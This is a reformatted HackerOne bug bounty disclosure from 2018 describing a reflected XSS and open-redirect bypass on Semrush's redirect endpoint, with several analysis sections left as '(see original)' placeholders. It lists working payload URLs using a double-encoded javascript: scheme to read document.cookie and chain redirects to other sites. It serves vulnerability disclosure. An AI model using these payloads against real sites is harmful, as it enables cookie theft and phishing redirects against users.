# XSS on redirection page( Bypassed) 

## Metadata
- **Source:** HackerOne
- **Report:** 316319 | https://hackerone.com/reports/316319
- **Submitted:** 2018-02-15
- **Reporter:** kunal94
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** low
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
Hello Semrush Team, 
 In this report id ```311330```, I was filled duplicate and redirection url is fixed which  made me feel happy as deserving bounty hunter gets a reward.

However, after fixing from last night, I finally bypassed the redirection method which not only Triggered Xss, but also it redirects to somewhere else.

```
https://www.semrush.com/redirect?url=https://(websitelink)
```

#To 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello Semrush Team, 
 In this report id ```311330```, I was filled duplicate and redirection url is fixed which  made me feel happy as deserving bounty hunter gets a reward.

However, after fixing from last night, I finally bypassed the redirection method which not only Triggered Xss, but also it redirects to somewhere else.

```
https://www.semrush.com/redirect?url=https://(websitelink)
```

#To reproduce

So,I tried to craft a XSS like ```javascript://%0aalert(document.cookie)``` at the end of redirection Url,so it doesn't work.
Afterwards,I encoded %0a to %250a, then modified the payload and injected at the end of url and it works like a charm.

Here are the XSS payloads
https://www.semrush.com/redirect?url=javascript://%250Aalert(document.cookie)
https://www.semrush.com/redirect?url=javascript://%250Aalert(document.domain)

When a particular user clicks the button,it's going to triggered an XSS.

Now,Here comes the tricky part regarding Unvalidated redirection-

Now if you inject ```javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")``` at the end of url like this 

https://www.semrush.com/redirect?url=javascript://%250Aalert(document.location="https://google.com",document.location="https://www.facebook.com")

and a particular user click go to site,first page will popup google.com and then it's going to redirect to facebook.com.

Please Consider it and let me know.

With Regards
Kunal

(Attaching with Single POC )
F263582

## Impact

An attacker can perform dangerous attacks using XSS.

</details>

---
*Analysed by Claude on 2026-05-24*
